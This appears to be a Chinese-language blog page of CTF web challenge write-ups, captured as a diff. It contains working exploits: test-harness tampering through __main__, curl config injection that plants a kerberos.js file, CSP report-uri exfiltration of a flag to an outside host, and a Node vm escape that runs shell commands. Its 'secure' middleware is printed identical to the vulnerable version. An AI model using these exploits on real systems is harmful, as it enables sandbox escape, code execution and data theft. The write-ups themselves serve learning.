+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">e</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">printables</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">script</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">e</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">digest</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crc</span>(<span style="color:#a6e22e">result</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">digest</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">target</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">result</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="scorescope">scorescope</h2>
+<p>查看测试环境的变量</p>
+<pre tabindex="0"><code>import __main__
+def add(a, b):
+    raise BaseException(dir(__main__))
+</code></pre><p>利用通过测试</p>
+<pre tabindex="0"><code>import __main__
+
+__main__.tests = [&#39;test_add_positive&#39;] * 22
+
+def add(a, b):
+    return a+b
+</code></pre><h2 id="unfinished">unfinished</h2>
+<p>没给注册功能，但后续的操作需要经过登录中间件验证，查看验证中间件如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">requiresLogin</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#34;/?error=You need to be logged in&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>对比如下安全版本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">requiresLogin</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#34;/?error=You need to be logged in&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>所以我们还是可以访问ping路由的，只是没有返回罢了</p>
+<p>ping路由使用了curl来执行命令，我们可以-o来指定生成.curlrc，然后使用-K来使用配置</p>
+<blockquote>
+<p>But, if you played ASIS CTF 2022&rsquo;s web/xtr challenge, you might know  that NodeJS will try to load some nonexistent .js files in some specific folders like <code>.node_modules</code>. Running <code>strace node /app/app.js</code> you would see that it tried to open the directory <code>/home/user/.node_modules/</code>. If you create that folder  then run <code>strace</code> again, you would see it tried to find the file <code>/home/user/.node_modules/kerberos.js</code>.</p>
+</blockquote>
+<p>在配置中使用<code>--create-dirs</code>去生成<code>.node_modules</code>目录，然后保存名为<code>kerberos.js</code>文件，即可在node崩溃重启后执行自定义的js文件</p>
+<p>作者的想法是利用telnet 去向<code>MongoDB</code>进行对应协议 的请求 然后查询flag后保存到本地 然后使用配置携带发送</p>
+<pre tabindex="0"><code>const BSON = require(&#34;bson&#34;);
+const fs = require(&#34;fs&#34;);
+
+const doc = {
+  find: &#34;flag&#34;,
+  $db: &#34;secret&#34;
+};
+const data = BSON.serialize(doc);
+
+let beginning = Buffer.from(
+  &#34;000000000000000000000000DD0700000000000000&#34;,
+  &#34;hex&#34;
+);
+let full = Buffer.concat([beginning, data]);
+
+full.writeUInt32LE(full.length, 0);
+fs.writeFileSync(&#34;bson.bin&#34;, full);
+</code></pre><h2 id="codebox">codebox</h2>
+<p>后端中的CSP可控</p>
+<pre tabindex="0"><code>    const csp = [
+        &#34;default-src &#39;none&#39;&#34;,
+        &#34;style-src &#39;unsafe-inline&#39;&#34;,
+        &#34;script-src &#39;unsafe-inline&#39;&#34;,
+    ];
+
+    if (images.length) {
+        csp.push(`img-src ${images.join(&#39; &#39;)}`);
+    }
+
+    res.header(&#39;Content-Security-Policy&#39;, csp.join(&#39;; &#39;));
+</code></pre><blockquote>
+<p>flag是通过innerHTML直接写入到DOM里，如果在CSP header里指定<code> require-trusted-types-for 'script'</code> ，这个 innerHTML 的赋值就会因为字符串没有经过 Trusted-Types 处理而违反CSP规则。</p>
+<p>违反CSP规则可以通过 report-uri 或者 report-to 来上报给指定的地址，上报的内容会包含一小部分错误详情。</p>
+<p>构造如下 payload 并访问：</p>
+<pre tabindex="0"><code>https://codebox.mc.ax/?code=&lt;img+src=&#34;111%3brequire-trusted-types-for+&#39;script&#39;%3breport-uri+http://csp.example.com%3b&#34;&gt;
+</code></pre></blockquote>
+<blockquote>
+<p>前端的 <code>code</code> 是通过浏览器的 URL 类 searchParams.get() 获取的，这个方法在存在多个相同参数的情况下取第一个。而后端取 <code>req.query.code</code> 的时候，express.js 取的是最后一个。</p>
+</blockquote>
+<h2 id="jwtjail">jwtjail</h2>
+<blockquote>
+<p><code>vm</code>的上下文为<code>Object.create(null)</code>，因此无法使用<code>this</code>的原型链获取v8上下文为vm外的Object</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">endpoint</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`https://jwtjail-fcf2ebccc5f50f79.mc.ax`</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">jwt</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;jsonwebtoken&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// const endpoint = `http://localhost:12345`
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">sign</span>({}, <span style="color:#e6db74">&#39;a&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">endpoint</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">`/api/verify`</span>, {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">token</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">token</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;`</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">secretOrPrivateKey</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(() =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  const c = (name, tar = {}) =&gt; new Proxy(
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    tar,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      apply: (...args) =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        try {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          const process = args[2].constructor.constructor.constructor(&#39;return process&#39;)()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          const flag = process
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            .binding(&#39;spawn_sync&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            .spawn({
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              maxBuffer: 1048576,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              shell: true,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              args: [ &#39;/bin/sh&#39;, &#39;-c&#39;, &#34;/readflag&#34; ],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              cwd: undefined,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              detached: false,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              envPairs: [&#39;PWD=/&#39;],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              file: &#39;/bin/sh&#39;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              windowsHide: false,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              windowsVerbatimArguments: false,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              killSignal: undefined,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              stdio: [
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                { type: &#39;pipe&#39;, readable: true, writable: false },
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                { type: &#39;pipe&#39;, readable: false, writable: true },
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                { type: &#39;pipe&#39;, readable: false, writable: true }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              ]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            }).output[1].toString().trim()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          console.log(flag)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          process.__proto__.__proto__.__proto__.constructor.prototype.toJSON =
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            () =&gt; flag
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        } catch (e) {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          console.log(e.stack)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      },
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      get: (...args) =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        if(args[1] === Symbol.toPrimitive) {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          return c(name + &#39;.&#39; + String(args[1]), () =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            throw new Error()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          });
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        return c(name + &#39;.&#39; + String(args[1]));
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  );
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  return c(&#39;a&#39;, {});
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">})()`</span>
+</span></span><span style="display:flex;"><span>  })
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">res</span>) =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>())
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>)
+</span></span></code></pre></div><blockquote>
+<p>返回的代理的<code>constructor.name.[Symbol.toPrimitive]</code>会被作为函数执行。其内部逻辑是在jsonwentoken模块试图将返回的Proxy生成key时，类型不匹配抛出错误，而生成错误文本时会试图读取类名称。对于Proxy的apply钩子，其第三个参数为调用者传入的参数列表，这个列表的v8上下文并不在vm内，从而可以返回<code>process</code>对象。使用<code>process.binding</code>即可做到shell任意命令执行。</p>
+</blockquote>
+
+        </article>
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+</footer>
+</body>
+</html>
